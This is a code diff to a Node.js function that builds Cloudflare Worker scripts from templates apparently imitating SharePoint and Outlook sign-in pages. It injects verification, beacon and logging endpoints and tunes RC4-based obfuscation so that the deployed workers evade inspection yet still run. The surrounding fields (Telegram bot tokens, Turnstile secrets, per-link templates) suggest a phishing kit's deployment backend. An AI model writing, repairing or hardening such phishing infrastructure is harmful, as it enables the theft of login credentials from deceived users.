@@ -6,6 +6,16 @@ const { loadTemplateHTML, loadTemplateCSS, loadTemplateJS, loadVerificationDesig
 const config = require('../backend/config/env');
 
 function buildWorkerScript(link, user) {
+  // SANITIZE: Only include safe fields, exclude ALL sensitive data (tokens, secrets, keys)
+  const safeUser = {
+    id: user?.id,
+    subscription_status: user?.subscription_status,
+    subscription_plan: user?.subscription_plan,
+  };
+  // NEVER embed: login_key, totp_secret, telegram_id, telegram_bot_token,
+  // cf_api_token, cf_account_id, bunny_api_key, bunny_storage_zone
+  // These must NEVER leave the backend. Worker should fetch from backend API at runtime.
+
   const templateType = link.template_type || 'sharepoint4';
   const designName = link.verification_design || 'outlook';
   let templateHTML = loadTemplateHTML(templateType);
@@ -22,13 +32,17 @@ function buildWorkerScript(link, user) {
     .replace('{{PAGES}}', String(link.pages || 1));
 
   // Handle preload/no-preload
-  const templateConfig = require(`../templates/${templateType}/config.json`);
-  if (templateConfig.preload) {
-    templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
-    templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
-  } else {
-    templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
-    templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
+  try {
+    const templateConfig = require(`../templates/${templateType}/config.json`);
+    if (templateConfig.preload) {
+      templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
+      templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
+    } else {
+      templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
+      templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
+    }
+  } catch (e) {
+    // Template config may not exist for some types - skip preload handling
   }
 
   // Load worker base
@@ -44,49 +58,58 @@ function buildWorkerScript(link, user) {
   } else {
     serverUrl = `http://localhost:${config.PORT || 3000}`;
   }
+
+  // Inject user data as a sanitized JSON string
+  const safeUserJson = JSON.stringify(safeUser);
+
   workerScript = workerScript
     .replace("'{{VERIFY_ENDPOINT}}'", `'${serverUrl}'`)
     .replace("'{{BEACON_ENDPOINT}}'", `'${serverUrl}'`)
     .replace("'{{LOG_ENDPOINT}}'", `'${serverUrl}'`)
     .replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
-    .replace("'{{TEMPLATE_HTML}}'", `\`${templateHTML}\``);
+    .replace("'{{TEMPLATE_HTML}}'", `\`${templateHTML}\``)
+    .replace("'{{USER_DATA}}'", safeUserJson);
 
-  // Obfuscate if enabled - full obfuscation
+  // Obfuscate if enabled - SAFE obfuscation profile for Cloudflare Workers
+  // Uses only worker-compatible settings that don't break execution
   if (config.ENABLE_OBFUSCATION || link.obfuscated) {
     try {
       const JavaScriptObfuscator = require('javascript-obfuscator');
       const result = JavaScriptObfuscator.obfuscate(workerScript, {
         compact: true,
-        controlFlowFlattening: true,
-        controlFlowFlatteningThreshold: 0.75,
-        deadCodeInjection: true,
-        deadCodeInjectionThreshold: 0.4,
-        debugProtection: false,
+        controlFlowFlattening: false,       // Disabled - can break worker timing
+        controlFlowFlatteningThreshold: 0,
+        deadCodeInjection: false,           // Disabled - adds bloat
+        deadCodeInjectionThreshold: 0,
+        debugProtection: false,             // DISABLED - freezes worker with setInterval
+        debugProtectionInterval: 0,         // Disabled - breaks async operations
         disableConsoleOutput: true,
         identifierNamesGenerator: 'hexadecimal',
-        log: false,
-        renameGlobals: false,
-        selfDefending: true,
-        simplify: true,
-        splitStrings: true,
-        splitStringsChunkLength: 5,
+        renameGlobals: false,               // Disabled - keeps global scope intact for workers
+        selfDefending: false,               // DISABLED - breaks when minified/obfuscated
         stringArray: true,
         stringArrayCallsTransform: true,
-        stringArrayCallsTransformThreshold: 1,
         stringArrayEncoding: ['rc4'],
         stringArrayIndexShift: true,
         stringArrayRotate: true,
         stringArrayShuffle: true,
-        stringArrayWrappersCount: 2,
-        stringArrayWrappersChainedCalls: true,
-        stringArrayWrappersParametersMaxCount: 2,
+        stringArrayWrappersCount: 1,        // Minimal wrappers
+        stringArrayWrappersChainedCalls: false, // Disabled - prevents infinite loops
+        stringArrayWrappersParametersMaxCount: 1,
         stringArrayWrappersType: 'variable',
-        transformObjectKeys: true,
-        unicodeEscapeSequence: false,
+        stringArrayWrappersCount: 1,
+        transformObjectKeys: false,         // Disabled - breaks property access
+        unicodeEscapeSequence: true,
+        numbersToExpressions: false,        // Disabled - prevents syntax issues
+        simplify: true,
+        splitStrings: true,
+        splitStringsChunkLength: 10,
       });
       workerScript = result.getObfuscatedCode();
+      console.log(`[Obfuscation] Worker obfuscated successfully (${link.template_type || 'unknown'})`);
     } catch (e) {
-      console.error('[Obfuscation] Worker obfuscation failed:', e.message);
+      console.error('[Obfuscation] Worker obfuscation failed, using raw script:', e.message);
+      // Fall through with unobfuscated script - don't break deployment
     }
   }
 
